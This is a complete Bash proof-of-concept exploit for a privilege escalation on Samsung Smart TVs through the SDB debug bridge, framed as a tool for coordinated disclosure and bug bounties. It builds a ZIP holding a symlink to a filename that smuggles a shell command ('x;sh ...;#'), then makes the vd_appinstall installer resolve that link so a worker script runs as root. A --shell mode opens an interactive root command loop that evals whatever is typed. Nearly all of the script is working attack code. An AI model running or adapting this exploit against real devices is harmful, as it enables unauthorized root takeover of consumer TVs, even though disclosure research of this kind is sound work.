#!/usr/bin/env bash
# Samsung Smart TV SDB vd_appinstall symlink-resolution privilege-escalation PoC
#
# Intended purpose: coordinated vulnerability disclosure / authorized testing.
# This PoC starts from an already-authorized Samsung TV SDB connection.
# It does NOT enable Developer Mode, bypass SDB pairing/authorization, persist
# changes, modify firmware, alter boot configuration, or install a permanent payload.
#
# Default mode (--proof-only) demonstrates the issue with temporary uploads and a small
# diagnostic worker that prints identity/security-context information and exits.
# Public CLI revision 1.1.0: usability changes; original exploit carrier retained.
# Optional --shell mode keeps the same exploited session open as an interactive
# command channel for authorized debugging. The bounty evidence run should use
# --proof-only.

set -Eeuo pipefail
IFS=$'\n\t'

DEFAULT_PORT="26101"
REMOTE_BASE="/opt/usr/apps/tmp"
MODE="proof"
RUN_NEGATIVE_CONTROL=0
TARGET=""
SDB_BIN="${SDB:-}"
LOG_PATH=""
CLEAR_SHELL=1
HOST_STDOUT_IS_TTY=0
[[ -t 1 ]] && HOST_STDOUT_IS_TTY=1

usage() {
  cat <<'USAGE'
Samsung Smart TV - SDB vd_appinstall privilege escalation PoC

Usage:
  ./Samsung-SDB-PoC.sh [--target HOST[:PORT]] [options]

Without --target, the script asks for the TV address interactively.
Default SDB port: 26101.

Options:
  -t, --target HOST[:PORT]   Authorized Samsung TV SDB endpoint.
  -s, --sdb PATH            Path to Samsung/Tizen sdb executable.
                             Auto-detected from $SDB, PATH or ~/tizen-studio/tools/sdb.
  -l, --log PATH            Evidence log (new file; existing files are preserved).
      --proof-only          Minimal, non-persistent identity/context proof (default).
      --shell               Interactive command channel after successful exploitation.
      --no-clear            Do not clear the screen when the root shell starts.
      --negative-control    Run an additional direct-path control test.
      --version             Show script version.
  -h, --help                Show this help.

Examples:
  ./Samsung-SDB-PoC.sh
  ./Samsung-SDB-PoC.sh --target 192.168.1.50 --proof-only
  ./Samsung-SDB-PoC.sh --target 192.168.1.50:26101 --shell
  ./Samsung-SDB-PoC.sh --target 192.168.1.50 --negative-control --proof-only

Requirements: Bash, Python 3.6+, Samsung/Tizen sdb, authorized SDB access.
macOS and Linux supported; Windows POSIX shells are not fully verified.

Important:
  For devices you own or are authorized to test only.
  Does not enable Developer Mode, bypass pairing, or create persistence.
  --shell executes commands with the privileges obtained by the PoC.
  A successful local check is not a guarantee that a firmware is vulnerable.
USAGE
}

info() { printf '==> %s\n' "$*"; }
warn() { printf 'WARNING: %s\n' "$*" >&2; }
die()  { printf '\nERROR: %s\n' "$*" >&2; [[ -z "$LOG_PATH" || ! -f "$LOG_PATH" ]] || printf 'Evidence log: %s\n' "$LOG_PATH" >&2; exit 1; }

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)
      [[ $# -ge 2 ]] || die "$1 requires a value"
      TARGET="$2"; shift 2 ;;
    -s|--sdb)
      [[ $# -ge 2 ]] || die "$1 requires a value"
      SDB_BIN="$2"; shift 2 ;;
    -l|--log)
      [[ $# -ge 2 ]] || die "$1 requires a value"
      LOG_PATH="$2"; shift 2 ;;
    --proof-only)
      MODE="proof"; shift ;;
    --shell)
      MODE="shell"; shift ;;
    --no-clear)
      CLEAR_SHELL=0; shift ;;
    --negative-control)
      RUN_NEGATIVE_CONTROL=1; shift ;;
    -h|--help)
      usage; exit 0 ;;
    --version)
      printf 'Samsung-SDB-PoC 1.1.0\n'; exit 0 ;;
    --)
      shift
      [[ $# -eq 0 ]] || die "Unexpected positional argument(s) after --"
      break ;;
    *)
      die "Unknown option: $1 (use --help)" ;;
  esac
done

if [[ -z "$TARGET" ]]; then
  [[ -t 0 ]] || die "TV address missing. Use --target IP[:PORT] when stdin is non-interactive."
  printf 'Samsung TV IP address (e.g. 192.168.1.50): ' >&2
  IFS= read -r TARGET || die "Could not read the TV address."
fi
[[ -n "$TARGET" ]] || die "The TV address cannot be empty."

# Accept IPv4 addresses and DNS names; never interpolate the input as shell code.
# IPv6 literals are deliberately not supported by this SDB-specific interface.
if [[ "$TARGET" == *:* ]]; then
  SDB_HOST="${TARGET%:*}"
  SDB_PORT="${TARGET##*:}"
else
  SDB_HOST="$TARGET"
  SDB_PORT="$DEFAULT_PORT"
fi
[[ "$SDB_HOST" =~ ^[A-Za-z0-9][A-Za-z0-9.-]*$ ]] \
  || die "Invalid TV host. Enter an IPv4 address or a DNS hostname."
[[ "$SDB_PORT" =~ ^[1-9][0-9]{0,4}$ ]] \
  || die "Invalid SDB port: $SDB_PORT (expected 1-65535)."
[[ "$SDB_PORT" -ge 1 && "$SDB_PORT" -le 65535 ]] \
  || die "SDB port must be between 1 and 65535."
if [[ "$SDB_HOST" =~ ^[0-9.]+$ ]]; then
  [[ "$SDB_HOST" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] \
    || die "Invalid IPv4 address: $SDB_HOST"
  IFS='.' read -r IP1 IP2 IP3 IP4 <<< "$SDB_HOST"
  for OCTET in "$IP1" "$IP2" "$IP3" "$IP4"; do
    [[ ${#OCTET} -le 3 ]] && ((10#$OCTET <= 255)) \
      || die "Invalid IPv4 address: $SDB_HOST"
  done
fi
TARGET="${SDB_HOST}:${SDB_PORT}"
if [[ "$MODE" == "shell" && "$CLEAR_SHELL" -eq 1 && "$HOST_STDOUT_IS_TTY" -eq 1 ]]; then
  EFFECTIVE_CLEAR_SHELL=1
else
  EFFECTIVE_CLEAR_SHELL=0
fi

if [[ -z "$SDB_BIN" ]]; then
  if command -v sdb >/dev/null 2>&1; then
    SDB_BIN="$(command -v sdb)"
  elif [[ -x "$HOME/tizen-studio/tools/sdb" ]]; then
    SDB_BIN="$HOME/tizen-studio/tools/sdb"
  elif [[ -x "$HOME/tizen-studio/tools/sdb.exe" ]]; then
    SDB_BIN="$HOME/tizen-studio/tools/sdb.exe"
  fi
fi

[[ -n "$SDB_BIN" ]] || die "Samsung/Tizen sdb was not found. Use --sdb PATH."
[[ -x "$SDB_BIN" ]] || die "sdb is not executable: $SDB_BIN"
command -v python3 >/dev/null 2>&1 || die "python3 is required."

RUN_STAMP="$(date '+%Y%m%d-%H%M%S')"
RUN_ID="$(python3 - <<'PY'
import secrets
print(secrets.token_hex(6))
PY
)"
TOKEN="sdbpoc${RUN_ID}"
APP_ID="SDBPOC${RUN_ID}"

if [[ -z "$LOG_PATH" ]]; then
  LOG_PATH="$PWD/samsung-tv-sdb-poc-${RUN_STAMP}-${RUN_ID}.log"
fi
mkdir -p "$(dirname "$LOG_PATH")" || die "Could not create evidence-log directory."
[[ ! -e "$LOG_PATH" ]] || die "Evidence log already exists; choose another --log path: $LOG_PATH"
( set -C; : > "$LOG_PATH" ) || die "Could not create evidence log: $LOG_PATH"

WORKDIR="$(mktemp -d "${TMPDIR:-/tmp}/samsung-tv-sdb-poc.XXXXXX")"
LOCAL_WORKER="$WORKDIR/worker.sh"
LOCAL_CONTROL_WORKER="$WORKDIR/control-worker.sh"
LOCAL_ZIP="$WORKDIR/${TOKEN}.zip"
SESSION_OUT="$WORKDIR/session.out"
CONTROL_OUT="$WORKDIR/control.out"
DEVICES_OUT="$WORKDIR/devices.out"
CAPABILITY_OUT="$WORKDIR/capability.out"
CONNECT_OUT="$WORKDIR/connect.out"

REMOTE_WORKER="$REMOTE_BASE/${TOKEN}-worker.sh"
REMOTE_CONTROL_WORKER="$REMOTE_BASE/${TOKEN}-control.sh"
REMOTE_ZIP="$REMOTE_BASE/${TOKEN}.zip"
REMOTE_DIR="$REMOTE_BASE/${TOKEN}"
READY_MARK="__SAMSUNG_SDB_POC_READY_${RUN_ID}__"
DONE_MARK="__SAMSUNG_SDB_POC_DONE_${RUN_ID}__"
CONTROL_MARK="__SAMSUNG_SDB_DIRECT_CONTROL_EXECUTED_${RUN_ID}__"

cleanup_local() {
  rm -rf "$WORKDIR" >/dev/null 2>&1 || true
}
trap cleanup_local EXIT
trap 'cleanup_local; exit 129' HUP
trap 'cleanup_local; exit 130' INT
trap 'cleanup_local; exit 143' TERM

# Tee everything after initial argument validation into the evidence log.
exec > >(tee -a "$LOG_PATH") 2>&1

sha256_file() {
  local p="$1"
  if command -v shasum >/dev/null 2>&1; then
    shasum -a 256 "$p" | awk '{print $1}'
  elif command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$p" | awk '{print $1}'
  else
    python3 - "$p" <<'PY'
import hashlib,sys
h=hashlib.sha256()
with open(sys.argv[1],'rb') as f:
    for b in iter(lambda:f.read(1024*1024), b''):
        h.update(b)
print(h.hexdigest())
PY
  fi
}

section() {
  printf '\n======================================================================\n'
  printf '%s\n' "$1"
  printf '======================================================================\n'
}

host_inventory() {
  section "HOST / TEST ENVIRONMENT"
  printf 'POC_NAME=Samsung-SDB-vd_appinstall-PoC\n'
  printf 'RUN_ID=%s\n' "$RUN_ID"
  printf 'START_LOCAL=%s\n' "$(date '+%Y-%m-%dT%H:%M:%S%z')"
  printf 'START_UTC=%s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  printf 'TARGET_SDB=%s\n' "$TARGET"
  printf 'MODE=%s\n' "$MODE"
  printf 'NEGATIVE_CONTROL=%s\n' "$RUN_NEGATIVE_CONTROL"
  printf 'HOST_PII_POLICY=SERIAL_UUID_UDID_HOSTNAME_OMITTED\n'
  printf 'UNAME_S=%s\n' "$(uname -s 2>/dev/null || echo unknown)"
  printf 'UNAME_M=%s\n' "$(uname -m 2>/dev/null || echo unknown)"
  printf 'KERNEL_RELEASE=%s\n' "$(uname -r 2>/dev/null || echo unknown)"
  printf 'KERNEL_VERSION=%s\n' "$(uname -v 2>/dev/null || echo unknown)"
  printf 'BASH_VERSION=%s\n' "${BASH_VERSION:-unknown}"
  printf 'PYTHON3=%s\n' "$(python3 --version 2>&1 || true)"
  SDB_DISPLAY="$SDB_BIN"
  if [[ -n "${HOME:-}" && "$SDB_DISPLAY" == "$HOME"* ]]; then SDB_DISPLAY="~${SDB_DISPLAY#$HOME}"; fi
  printf 'SDB_BIN=%s\n' "$SDB_DISPLAY"
  printf 'SDB_VERSION_BEGIN\n'
  "$SDB_BIN" version 2>&1 || true
  printf 'SDB_VERSION_END\n'

  case "$(uname -s 2>/dev/null || true)" in
    Darwin)
      printf 'HOST_OS_FAMILY=macOS\n'
      if command -v sw_vers >/dev/null 2>&1; then
        printf 'SW_VERS_BEGIN\n'; sw_vers 2>&1; printf 'SW_VERS_END\n'
      fi
      if command -v sysctl >/dev/null 2>&1; then
        printf 'HW_MODEL=%s\n' "$(sysctl -n hw.model 2>/dev/null || echo unknown)"
        printf 'HW_MACHINE=%s\n' "$(sysctl -n hw.machine 2>/dev/null || echo unknown)"
        printf 'HW_NCPU=%s\n' "$(sysctl -n hw.ncpu 2>/dev/null || echo unknown)"
        printf 'HW_MEMSIZE=%s\n' "$(sysctl -n hw.memsize 2>/dev/null || echo unknown)"
        printf 'CPU_BRAND=%s\n' "$(sysctl -n machdep.cpu.brand_string 2>/dev/null || echo unavailable)"
      fi
      if command -v system_profiler >/dev/null 2>&1; then
        printf 'SYSTEM_PROFILER_HARDWARE_BEGIN\n'
        system_profiler SPHardwareDataType 2>/dev/null | awk '
          /^[[:space:]]*(Model Name|Model Identifier|Model Number|Chip|Processor Name|Processor Speed|Total Number of Cores|Memory|System Firmware Version|OS Loader Version):/ {print}
        ' || true
        printf 'SYSTEM_PROFILER_HARDWARE_END\n'
      fi
      ;;
    Linux)
      printf 'HOST_OS_FAMILY=Linux\n'
      if [[ -r /etc/os-release ]]; then
        printf 'OS_RELEASE_BEGIN\n'; cat /etc/os-release; printf 'OS_RELEASE_END\n'
      fi
      for p in sys_vendor product_name product_version board_name; do
        if [[ -r "/sys/class/dmi/id/$p" ]]; then
          printf 'DMI_%s=%s\n' "$(printf '%s' "$p" | tr '[:lower:]' '[:upper:]')" "$(cat "/sys/class/dmi/id/$p" 2>/dev/null || true)"
        fi
      done
      if command -v lscpu >/dev/null 2>&1; then
        printf 'LSCPU_RELEVANT_BEGIN\n'
        lscpu 2>&1 | grep -E '^(Architecture|CPU\(s\)|Vendor ID|Model name|Hypervisor vendor|Virtualization type):' || true
        printf 'LSCPU_RELEVANT_END\n'
      elif [[ -r /proc/cpuinfo ]]; then
        printf 'CPUINFO_RELEVANT_BEGIN\n'
        grep -E -m 12 '^(model name|Hardware|Model|Processor|vendor_id|cpu model)[[:space:]]*:' /proc/cpuinfo 2>/dev/null || true
        printf 'CPUINFO_RELEVANT_END\n'
      fi
      ;;
    MINGW*|MSYS*|CYGWIN*)
      printf 'HOST_OS_FAMILY=Windows-POSIX-compatibility-layer\n'
      if command -v cmd.exe >/dev/null 2>&1; then
        printf 'WINDOWS_VER=%s\n' "$(cmd.exe /c ver 2>/dev/null | tr -d '\r' || true)"
      fi
      ;;
    *)
      printf 'HOST_OS_FAMILY=Other\n'
      ;;
  esac

  if [[ -f "${BASH_SOURCE[0]}" ]]; then
    printf 'POC_SCRIPT_SHA256=%s\n' "$(sha256_file "${BASH_SOURCE[0]}")"
  fi
}

build_workers() {
  cat > "$LOCAL_CONTROL_WORKER" <<EOF_CONTROL
#!/bin/sh
PATH='/usr/sbin:/usr/bin:/sbin:/bin:/opt/usr/bin:/opt/bin'
export PATH
printf '%s\\n' '$CONTROL_MARK'
printf 'IDENTITY=%s\\n' "\$(id 2>&1)"
printf 'SECURITY_CONTEXT='
if [ -r /proc/self/attr/current ]; then cat /proc/self/attr/current 2>/dev/null || true; else printf 'unavailable'; fi
printf '\\n'
exit 0
EOF_CONTROL
  chmod 0755 "$LOCAL_CONTROL_WORKER"

  cat > "$LOCAL_WORKER" <<EOF_WORKER
#!/bin/sh
PATH='/usr/sbin:/usr/bin:/sbin:/bin:/opt/usr/bin:/opt/bin'
export PATH
MODE='$MODE'
CLEAR_TERMINAL='$EFFECTIVE_CLEAR_SHELL'
READY='$READY_MARK'
DONE='$DONE_MARK'
REMOTE_DIR='$REMOTE_DIR'
REMOTE_ZIP='$REMOTE_ZIP'
REMOTE_WORKER='$REMOTE_WORKER'
REMOTE_CONTROL_WORKER='$REMOTE_CONTROL_WORKER'

cleanup_remote() {
  rm -rf "\$REMOTE_DIR" "\$REMOTE_ZIP" "\$REMOTE_WORKER" "\$REMOTE_CONTROL_WORKER" >/dev/null 2>&1 || true
}
trap cleanup_remote EXIT HUP INT TERM

printf '%s\\n' "\$READY"
printf 'IDENTITY=%s\\n' "\$(id 2>&1)"
printf 'SECURITY_CONTEXT='
if [ -r /proc/self/attr/current ]; then cat /proc/self/attr/current 2>/dev/null || true; else printf 'unavailable'; fi
printf '\\n'
printf 'TV_UNAME=%s\\n' "\$(uname -a 2>/dev/null || echo unknown)"
if [ -r /etc/os-release ]; then
  printf 'TV_OS_RELEASE_BEGIN\\n'
  cat /etc/os-release 2>/dev/null || true
  printf 'TV_OS_RELEASE_END\\n'
fi
if [ -r /etc/tizen-platform.conf ]; then
  printf 'TV_TIZEN_PLATFORM_CONF_BEGIN\\n'
  cat /etc/tizen-platform.conf 2>/dev/null || true
  printf 'TV_TIZEN_PLATFORM_CONF_END\\n'
fi

if [ "\$MODE" = 'shell' ]; then
  if [ "\$(id -u 2>/dev/null)" != '0' ]; then
    printf 'ERROR: interactive shell refused; root identity was not obtained.\\n'
    exit 2
  fi
  printf '__SAMSUNG_SDB_POC_INTERACTIVE_SHELL__\\n'
  printf 'Type exit or quit to close the session.\\n'
  if [ "\$CLEAR_TERMINAL" = '1' ]; then
    # Only for an attached terminal: preserve all preflight evidence in the log.
    printf '\\033[2J\\033[H'
  fi
  while true; do
    printf 'sdb-poc-root# '
    IFS= read -r CMD || break
    case "\$CMD" in
      exit|quit) break ;;
      '') continue ;;
      *)
        eval "\$CMD" 2>&1
        RC=\$?
        if [ "\$RC" -ne 0 ]; then
          printf '[exit status: %s]\\n' "\$RC"
        fi
        ;;
    esac
  done
fi

printf '%s\\n' "\$DONE"
exit 0
EOF_WORKER
  chmod 0755 "$LOCAL_WORKER"
}

build_carrier() {
  local payload_name="x;sh ${REMOTE_WORKER};#"
  python3 - "$LOCAL_ZIP" "$payload_name" <<'PY'
import stat,sys,zipfile
zip_path,payload=sys.argv[1:]
with zipfile.ZipFile(zip_path,'w',compression=zipfile.ZIP_STORED) as z:
    regular=zipfile.ZipInfo(payload)
    regular.create_system=3
    regular.external_attr=(stat.S_IFREG|0o644)<<16
    z.writestr(regular,b'x\n')
    link=zipfile.ZipInfo('link')
    link.create_system=3
    link.external_attr=(stat.S_IFLNK|0o777)<<16
    z.writestr(link,payload.encode('utf-8'))
PY
}

run_with_timeout() {
  # Usage: run_with_timeout SECONDS OUTFILE command args...
  # Portable to the Bash 3.2 shipped with macOS (no GNU timeout required).
  local seconds="$1" outfile="$2"
  shift 2
  : > "$outfile"

  "$@" > "$outfile" 2>&1 &
  local pid=$!
  local timeout_flag="$WORKDIR/timeout.$pid"

  (
    # Keep the watchdog and its timer off the SDB/session output pipes.
    # Otherwise a successful run can leave the evidence tee waiting for EOF.
    timer_pid=""
    trap '[[ -z "$timer_pid" ]] || kill "$timer_pid" >/dev/null 2>&1 || true; exit 0' TERM INT HUP
    sleep "$seconds" &
    timer_pid=$!
    wait "$timer_pid" || exit 0
    if kill -0 "$pid" 2>/dev/null; then
      : > "$timeout_flag"
      kill "$pid" >/dev/null 2>&1 || true
      sleep 1
      kill -9 "$pid" >/dev/null 2>&1 || true
    fi
  ) </dev/null >/dev/null 2>&1 &
  local watchdog=$!

  local rc=0
  if wait "$pid"; then
    rc=0
  else
    rc=$?
  fi

  kill "$watchdog" >/dev/null 2>&1 || true
  wait "$watchdog" >/dev/null 2>&1 || true

  if [[ -f "$timeout_flag" ]]; then
    printf 'LOCAL_TIMEOUT_AFTER_SECONDS=%s\n' "$seconds" >> "$outfile"
    return 124
  fi
  return "$rc"
}

host_inventory

check_connected_device() {
  if ! "$SDB_BIN" devices >"$DEVICES_OUT" 2>&1; then
    cat "$DEVICES_OUT"
    die "Could not obtain the SDB device list. Check the local SDB installation."
  fi
  cat "$DEVICES_OUT"
  local state
  state="$(awk -v t="$TARGET" '$1 == t {gsub(/\r/, "", $2); print $2; exit}' "$DEVICES_OUT")"
  case "$state" in
    device) return 0 ;;
    offline) die "TV appears in SDB but is offline. Reconnect it and check Developer Mode." ;;
    unauthorized) die "SDB is not authorized for this TV. Check the TV's developer/host IP settings." ;;
    "") die "No active SDB device named $TARGET. Check the address, TV network and Developer Mode." ;;
    *) die "SDB target $TARGET is not ready (state: $state)." ;;
  esac
}

section "SDB CONNECTION / TARGET CAPABILITIES"
set +e
run_with_timeout 20 "$CONNECT_OUT" "$SDB_BIN" connect "$TARGET"
CONNECT_RC=$?
set -e
cat "$CONNECT_OUT"
printf 'SDB_CONNECT_RC=%s\n' "$CONNECT_RC"
if [[ "$CONNECT_RC" -eq 124 ]]; then
  die "SDB connection timed out for $TARGET. Verify that the TV is reachable and TCP port $SDB_PORT is open."
fi
[[ "$CONNECT_RC" -eq 0 ]] \
  || die "SDB connection failed for $TARGET. Verify IP, port, Developer Mode and authorized host IP."
check_connected_device
printf 'SDB_CAPABILITY_BEGIN\n'
"$SDB_BIN" -s "$TARGET" capability >"$CAPABILITY_OUT" 2>&1 || true
cat "$CAPABILITY_OUT"
printf 'SDB_CAPABILITY_END\n'
SDB_PLATFORM_VERSION="$(awk -F: '$1=="platform_version"{print $2; exit}' "$CAPABILITY_OUT" | tr -d '\r' || true)"
SDB_PROFILE_NAME="$(awk -F: '$1=="profile_name"{print $2; exit}' "$CAPABILITY_OUT" | tr -d '\r' || true)"
SDB_VENDOR_NAME="$(awk -F: '$1=="vendor_name"{print $2; exit}' "$CAPABILITY_OUT" | tr -d '\r' || true)"
SDB_DEVICE_LABEL="$(awk -v t="$TARGET" '$1==t {print $3; exit}' "$DEVICES_OUT" 2>/dev/null || true)"
printf 'TARGET_SDB_DEVICE_LABEL=%s\n' "${SDB_DEVICE_LABEL:-NOT_AVAILABLE}"
printf 'TARGET_SDB_PLATFORM_VERSION=%s\n' "${SDB_PLATFORM_VERSION:-NOT_AVAILABLE}"
printf 'TARGET_SDB_PROFILE=%s\n' "${SDB_PROFILE_NAME:-NOT_AVAILABLE}"
printf 'TARGET_SDB_VENDOR=%s\n' "${SDB_VENDOR_NAME:-NOT_AVAILABLE}"

section "BUILD MINIMAL POC"
build_workers
build_carrier
printf 'LOCAL_WORKER_SHA256=%s\n' "$(sha256_file "$LOCAL_WORKER")"
printf 'LOCAL_CONTROL_WORKER_SHA256=%s\n' "$(sha256_file "$LOCAL_CONTROL_WORKER")"
printf 'LOCAL_CARRIER_SHA256=%s\n' "$(sha256_file "$LOCAL_ZIP")"
printf 'REMOTE_WORKER=%s\n' "$REMOTE_WORKER"
printf 'REMOTE_ZIP=%s\n' "$REMOTE_ZIP"
printf 'REMOTE_DIR=%s\n' "$REMOTE_DIR"
printf 'APP_ID=%s\n' "$APP_ID"

section "UPLOAD TEMPORARY POC FILES"
"$SDB_BIN" -s "$TARGET" push "$LOCAL_WORKER" "$REMOTE_WORKER" \
  || die "Could not upload the temporary diagnostic worker (SDB lost or remote path unwritable)."
"$SDB_BIN" -s "$TARGET" push "$LOCAL_CONTROL_WORKER" "$REMOTE_CONTROL_WORKER" \
  || die "Could not upload the negative-control worker (SDB lost or remote path unwritable)."
"$SDB_BIN" -s "$TARGET" push "$LOCAL_ZIP" "$REMOTE_ZIP" \
  || die "Could not upload the temporary ZIP carrier (SDB lost or remote path unwritable)."

if [[ "$RUN_NEGATIVE_CONTROL" -eq 1 ]]; then
  section "NEGATIVE CONTROL: DIRECT METACHARACTER PATH"
  DIRECT_PATH="x;sh ${REMOTE_CONTROL_WORKER};#"
  printf 'DIRECT_CONTROL_PATH=%s\n' "$DIRECT_PATH"
  set +e
  run_with_timeout 12 "$CONTROL_OUT" "$SDB_BIN" -s "$TARGET" shell 0 vd_appinstall "$APP_ID" "$DIRECT_PATH"
  CONTROL_RC=$?
  set -e
  cat "$CONTROL_OUT"
  printf 'DIRECT_CONTROL_LOCAL_RC=%s\n' "$CONTROL_RC"
  if grep -Fq "$CONTROL_MARK" "$CONTROL_OUT"; then
    printf 'NEGATIVE_CONTROL_RESULT=UNEXPECTED_COMMAND_EXECUTION\n'
    warn "Direct metacharacter path executed on this target. Do not describe this run as a negative control rejection."
  else
    printf 'NEGATIVE_CONTROL_RESULT=DIRECT_PATH_REJECTED_OR_CLOSED_NO_CONTROLLED_EXECUTION\n'
  fi

  # The direct-control request may close/restart the SDB transport on some builds.
  set +e
  run_with_timeout 20 "$CONNECT_OUT" "$SDB_BIN" connect "$TARGET"
  RECONNECT_RC=$?
  set -e
  cat "$CONNECT_OUT"
  printf 'SDB_RECONNECT_AFTER_CONTROL_RC=%s\n' "$RECONNECT_RC"
  [[ "$RECONNECT_RC" -eq 0 ]] || die "Could not reconnect after negative-control test."
  check_connected_device
fi

section "MATERIALIZE SYMBOLIC LINK VIA un_zip"
set +e
UNZIP_OUT="$("$SDB_BIN" -s "$TARGET" shell 0 un_zip "$TOKEN" "$TOKEN" 2>&1)"
UNZIP_RC=$?
set -e
printf '%s\n' "$UNZIP_OUT"
printf 'UN_ZIP_RC=%s\n' "$UNZIP_RC"
if printf '%s\n' "$UNZIP_OUT" | grep -Fq 'lchmod (file attributes) error: Function not implemented'; then
  printf 'UN_ZIP_LCHMOD_WARNING=NON_FATAL_SYMLINK_ATTRIBUTE_WARNING_OBSERVED\n'
fi
[[ "$UNZIP_RC" -eq 0 ]] || die "un_zip failed; exploit not attempted."

section "TRIGGER vd_appinstall VIA BENIGN SYMLINK PATH"
printf 'VD_APPINSTALL_ARGUMENT=%s\n' "$REMOTE_DIR/link"
printf 'EXPECTED_READY_MARK=%s\n' "$READY_MARK"

if [[ "$MODE" == "shell" ]]; then
  printf 'INTERACTIVE_MODE=YES\n'
  printf 'The session below is logged verbatim. Type exit or quit to close it.\n'
  set +e
  "$SDB_BIN" -s "$TARGET" shell 0 vd_appinstall "$APP_ID" "$REMOTE_DIR/link" 2>&1 | tee "$SESSION_OUT"
  VD_RC=${PIPESTATUS[0]}
  set -e
else
  printf 'INTERACTIVE_MODE=NO\n'
  set +e
  run_with_timeout 20 "$SESSION_OUT" "$SDB_BIN" -s "$TARGET" shell 0 vd_appinstall "$APP_ID" "$REMOTE_DIR/link"
  VD_RC=$?
  set -e
  cat "$SESSION_OUT"
fi
printf 'VD_APPINSTALL_LOCAL_RC=%s\n' "$VD_RC"

section "RESULT"
ROOT_OK=NO
READY_OK=NO
DONE_OK=NO
if grep -Fq "$READY_MARK" "$SESSION_OUT"; then READY_OK=YES; fi
if grep -Fq "$DONE_MARK" "$SESSION_OUT"; then DONE_OK=YES; fi
IDENTITY_LINE="$(grep -E '^IDENTITY=' "$SESSION_OUT" 2>/dev/null | head -n1 | tr -d '\r' || true)"
if [[ "$IDENTITY_LINE" =~ ^IDENTITY=uid=0\(root\) ]]; then ROOT_OK=YES; fi

CONTEXT_LINE="$(grep -E '^SECURITY_CONTEXT=' "$SESSION_OUT" 2>/dev/null | tail -n1 | tr -d '\r' || true)"
TV_OS_VERSION_ID="$(awk '{ sub(/\r$/, "", $0) } /^TV_OS_RELEASE_BEGIN$/{on=1;next} /^TV_OS_RELEASE_END$/{on=0} on && /^VERSION_ID=/{sub(/^VERSION_ID=/,""); gsub(/^"|"$/,""); print; exit}' "$SESSION_OUT" 2>/dev/null || true)"
TV_OS_PRETTY_NAME="$(awk '{ sub(/\r$/, "", $0) } /^TV_OS_RELEASE_BEGIN$/{on=1;next} /^TV_OS_RELEASE_END$/{on=0} on && /^PRETTY_NAME=/{sub(/^PRETTY_NAME=/,""); gsub(/^"|"$/,""); print; exit}' "$SESSION_OUT" 2>/dev/null || true)"
printf 'READY_MARK_OBSERVED=%s\n' "$READY_OK"
printf 'DONE_MARK_OBSERVED=%s\n' "$DONE_OK"
printf 'ROOT_UID0_OBSERVED=%s\n' "$ROOT_OK"
printf 'OBSERVED_%s\n' "${IDENTITY_LINE:-IDENTITY=NOT_AVAILABLE}"
printf 'OBSERVED_%s\n' "${CONTEXT_LINE:-SECURITY_CONTEXT=NOT_AVAILABLE}"
printf 'OBSERVED_TV_OS_VERSION_ID=%s\n' "${TV_OS_VERSION_ID:-NOT_AVAILABLE}"
printf 'OBSERVED_TV_OS_PRETTY_NAME=%s\n' "${TV_OS_PRETTY_NAME:-NOT_AVAILABLE}"
if [[ -n "${SDB_PLATFORM_VERSION:-}" && -n "${TV_OS_VERSION_ID:-}" && "$SDB_PLATFORM_VERSION" != "$TV_OS_VERSION_ID" ]]; then
  printf 'TARGET_VERSION_METADATA_NOTE=SDB_PLATFORM_VERSION_AND_LIVE_OS_RELEASE_VERSION_DIFFER\n'
fi
if grep -Fq 'install failed[APP_NOT_EXIST]' "$SESSION_OUT"; then
  printf 'INSTALLER_APP_NOT_EXIST_OBSERVED=YES\n'
  printf 'INSTALLER_NOTE=The installer failure concerns the truncated package path; the controlled worker execution is evaluated separately below.\n'
else
  printf 'INSTALLER_APP_NOT_EXIST_OBSERVED=NO\n'
fi

if [[ "$ROOT_OK" == "YES" && "$READY_OK" == "YES" && "$DONE_OK" == "YES" ]]; then
  printf 'POC_RESULT=VULNERABLE_UID0_COMMAND_EXECUTION_CONFIRMED\n'
else
  printf 'POC_RESULT=UID0_NOT_CONFIRMED_OR_SESSION_INCOMPLETE\n'
  printf 'RESULT_NOTE=Do not infer that the firmware is patched from this result alone; inspect the evidence log.\n'
fi
printf 'END_LOCAL=%s\n' "$(date '+%Y-%m-%dT%H:%M:%S%z')"
printf 'END_UTC=%s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
printf 'EVIDENCE_LOG_NAME=%s\n' "$(basename "$LOG_PATH")"
printf 'LOCAL_TEMP_CLEANUP=ENABLED\n'
printf 'REMOTE_TEMP_CLEANUP=WORKER_TRAP_ON_SUCCESS\n'

if [[ "$ROOT_OK" != "YES" || "$READY_OK" != "YES" || "$DONE_OK" != "YES" ]]; then
  exit 2
fi
exit 0
